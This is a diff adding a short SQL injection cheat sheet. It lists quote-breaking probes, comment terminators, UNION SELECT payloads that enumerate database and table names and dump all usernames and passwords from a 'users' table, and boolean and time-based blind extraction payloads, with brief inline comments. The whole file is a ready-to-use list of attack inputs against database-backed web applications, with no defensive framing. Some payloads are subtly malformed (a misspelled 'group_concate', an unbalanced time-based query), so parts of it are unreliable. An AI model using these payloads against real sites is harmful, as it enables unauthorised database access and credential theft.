@@ -1,0 +1,48 @@
+id=1'
+id=1' -- 
+id=1' --+
+id=1' --+%20
+id=1' #
+id=1' %23
+id=1' or '1  // id=-1' union all select 1,2,3 or '1 
+id=1' AND '1  // id=-1' union all select 1,database(),3 AND '1 
+id=1 --+
+id=1') --+
+id=1')) --+
+id=1") --+
+id=1' AND sleep(10) --+
+") or 1=1 #
+") or sleep(10) #
+
+
+id=1' order by <number of columns> --+    // to get number of columns used in current query
+id=-1 union all  select 1,2,3 --+  //provide non existing number to id and make it able to run query after 'union'
+id=-1 union all  select 1,database(),version() --+  //getting database name and version, can olso use @@version
+id=-1 union all  select 1,table_name,3 from information_schema.tables where table_schema=database() --+  //getting table name
+id=-1 union all  select 1,group_concate(table_name),3 from information_schema.tables where table_schema=database() --+  //getting all tables
+id=-1 union all  select 1,group_concate(column_name),3 from information_schema.columns where table_name='users' --+  //getting columns of 'users' table
+id=-1 union all  select 1,group_concate(username),group_concate(password) from users --+  //getting all records of 'users' table
+id=-1 union all  select 1,current_user,3 --+  //getting current user
+
+get db values in error
+
+#Guess each character with boolean condition // ascii value of first character is 115 i.e. 's'
+select ascii(substr(database(),1,1))= < ascii value of a-z to be guessed >
+e.g id=1' AND (select ascii(substr(database(),1,1))= 115) --+ 
+
+#Guess each character with time 
+select if(select substr(table_name,1,1) from information_schema.tables where table_schema=<database name> limit 0,1)
+='<value to be guessed>',sleep(10),null);
+e.g. id=1' AND (select if(select substr(table_name,1,1) from information_schema.tables where table_schema=<database name> limit 0,1)='e',sleep(10),null)) --+ 
+
+tamper data plugin
+cookies manager
+
+
+
+
+in code
+
+id='$id' // ' will break the query
+id=$id // no need to use '
+
